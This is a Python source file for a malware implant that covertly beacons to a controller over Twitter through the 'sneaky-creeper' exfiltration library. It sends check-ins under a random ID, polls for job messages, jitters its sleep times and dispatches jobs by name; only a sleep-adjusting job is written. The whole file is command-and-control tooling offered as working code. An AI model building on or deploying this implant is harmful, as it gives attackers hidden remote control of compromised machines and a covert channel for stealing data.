#! /usr/bin/env python

import os
import sys
import string
import random
from time import sleep

# put sneaky-creeper on the path, then import it
basePath = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(basePath, 'sneaky-creeper'))
from sneakers import Exfil

channel = "twitter"
encoders = []

channelParams = {'sending': {
                 },

                 'receiving': {
                 }
                }

encoderParams = {}

class Comms:
    """ Encapsulates all of the methods and data needed to communicate
        with the outside world """

    def __init__(self, channel, encoders, channelParams, encoderParams):
        self.channel = channel
        self.encoders = encoders
        self.channelParams = channelParams
        self.encoderParams = encoderParams

        # actual sleep time will be randomly chosen between the following two
        self.minSleepTime = 1 # minimum seconds to sleep between checkins
        self.maxSleepTime = 5 # maximum seconds to sleep between checkins

        # generate a uid for ourselves
        self.uid = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(20)])

        # this sets a self.feed attribute
        self.setUpFeed()

    def setUpFeed(self):
        """ Set up the sneaky-creeper comms channel object """

        feed = Exfil(channel, encoders)
        feed.set_channel_params(self.channelParams)
        for enc, params in self.encoderParams.items():
            feed.set_encoder_params(enc, params)

        self.feed = feed

    def sendCheckin(self):
        """ sends a checkin packet on the feed """
        self.feed.send("{}:checkin".format(self.uid))

    def sendMessage(self, msg):
        """ sends a generic 'message' packet on the feed """
        self.feed.send("{}:message:{}".format(self.uid, msg))

    def setSleep(self, minSleep, maxSleep):
        """ sets the amount of time to sleep between checkins """
        self.minSleepTime = float(minSleep)
        self.maxSleepTime = float(maxSleep)

    def receive(self):
        """ Retrieve messages from the comms feed and return them if they're
            for us """
        msgs = self.feed.receive()
        forUs = []

        for msg in msgs:
            tokenized = msg.split(":", 4)
            if tokenized[0] == self.uid:
                forUs.append(tokenized[1:])

        print("messages for us:")
        print(forUs)
        print("----------")
        return forUs


class Jobs:
    """ Contains definitions for all the tasks this implant can carry out """
    def __init__(self, comms):
        self.completed = []
        self.comms = comms

    def setSleep(self, cmdString):
        """ update the minimum and maximum sleep times
            cmdString format:
                minTime-maxTime
        """
        args = cmdString.split('-')
        # args should now contain [minTime, maxTime]
        try:
            comms.setSleep(int(args[0]), int(args[1]))
        except ValueError:
            # setSleep was unable to parse the arguments to floats
            self.comms.sendMessage('unable to update sleep time')

    def handle(self, msg):
        """ when passed a job message, handles it appropriately
            (either executes it, or checks that we've already done it)
        """
        print("WE GOT A JOB TA DO")

        print(msg)
        [jobId, jobName, cmdString] = msg

        # if we've already done this job, continue
        # otherwise mark it as done, then farm it out
        if jobId in self.completed:
            print('nevermind, we already did this')
            return
        else:
            self.completed.append(jobId)

            # call the function with the name jobName
            getattr(self, jobName)(cmdString)
            # TODO in a thread

if __name__ == "__main__":
    # set up our comms channel
    comms = Comms(channel, encoders, channelParams, encoderParams)

    # set up our jobs handler
    jobs = Jobs(comms)

    # check in
    comms.sendCheckin()

    try:
        while True:
            # get the latest messages
            msgs = comms.receive()
            # run through them all and route them appropriately
            for message in msgs:
                if message[0] == 'job':
                    # have the jobs object handle this job
                    jobs.handle(message[1:])

            sleepTime = random.uniform(comms.minSleepTime, comms.maxSleepTime)
            print(sleepTime)
            sleep(sleepTime)

    except KeyboardInterrupt:
        pass
